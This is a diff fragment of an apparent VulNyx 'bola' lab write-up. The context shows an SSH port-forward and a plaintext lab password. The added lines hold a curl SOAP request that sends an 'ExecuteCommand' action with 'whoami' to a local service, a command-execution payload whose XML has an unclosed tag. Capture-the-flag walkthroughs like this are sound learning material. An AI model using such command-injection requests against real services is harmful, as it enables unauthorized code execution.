@@ -60,7 +60,24 @@ ssh -L 9000:127.0.0.1:9000 d4t4s3c@bola.nyx
 VulNyxtestinglogin123
 ```
 
-# WDSL
+# WSDL
+
+```bash
+curl -X POST http://localhost:9000 -H "Content-Type: text/xml; charset=utf-8" -H 
+"SOAPAction: \"ExecuteCommand\"" -d '<?xml version="1.0" encoding="utf-8"?>  
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns="http://localhost/wsdl">  
+  <soapenv:Header/>  
+  <soapenv:Body>  
+     <LoginRequest>  
+        <cmd>whoami</cmd>  
+     <LoginRequest>  
+  </soapenv:Body>  
+</soapenv:Envelope>
+```
+
+
+
+
 
 
 
